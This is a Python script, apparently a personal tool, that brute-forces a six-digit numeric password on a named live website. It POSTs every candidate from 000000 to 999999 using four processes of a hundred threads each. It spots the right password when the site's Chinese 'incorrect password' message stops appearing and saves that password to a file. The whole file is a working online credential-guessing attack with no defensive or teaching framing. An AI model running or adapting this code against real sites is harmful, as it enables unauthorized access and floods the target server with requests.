"""
@author: Alfons
@contact: alfons_xh@163.com
@file: LoufengSpider.py
@time: 18-7-15 上午10:33
@version: v1.0 
"""
import string
import requests
import threading
import multiprocessing
import time

url = "http://m.18xjweb.com/?yes"
passwordLen = 6
needRun = True


def GetPassword():
    for password in range(9387, 1000000):
        passwordStr = str(password)
        addZeros = ""
        if len(passwordStr) < passwordLen:
            addZeros = "0" * (passwordLen - len(str(password)))
        passwordStr = addZeros + passwordStr

        yield passwordStr


def PostPasswordThread(processId, ThreadId):
    global needRun
    for password in range(processId * 250000 + ThreadId * 2500, processId * 250000 + (ThreadId + 1) * 2500):
        passwordStr = str(password)
        addZeros = ""
        if len(passwordStr) < passwordLen:
            addZeros = "0" * (passwordLen - len(str(passwordStr)))
        passwordStr = addZeros + passwordStr

        data = dict(pwd=passwordStr)
        res = requests.post(url=url, data=data)
        print("({processId}, {id}) test {password}.".format(processId=processId, id=ThreadId, password=passwordStr))
        if "密码不正确，请重新输入。" not in res.content.decode("gb2312"):
            print("密码:{key}".format(key=passwordStr))
            with open("password", "w") as f:
                f.write(passwordStr)
            needRun = False
            break


def PostPasswordProcess(processId):
    for i in range(100):
        thread = threading.Thread(target=PostPasswordThread, args=(processId, i), name="Tread {id}.".format(id=i))
        thread.start()

    while needRun:
        time.sleep(30)


for i in range(4):
    process = multiprocessing.Process(target=PostPasswordProcess, args=(i,), name="Process {id}".format(id=i))
    process.start()

print("Over!")
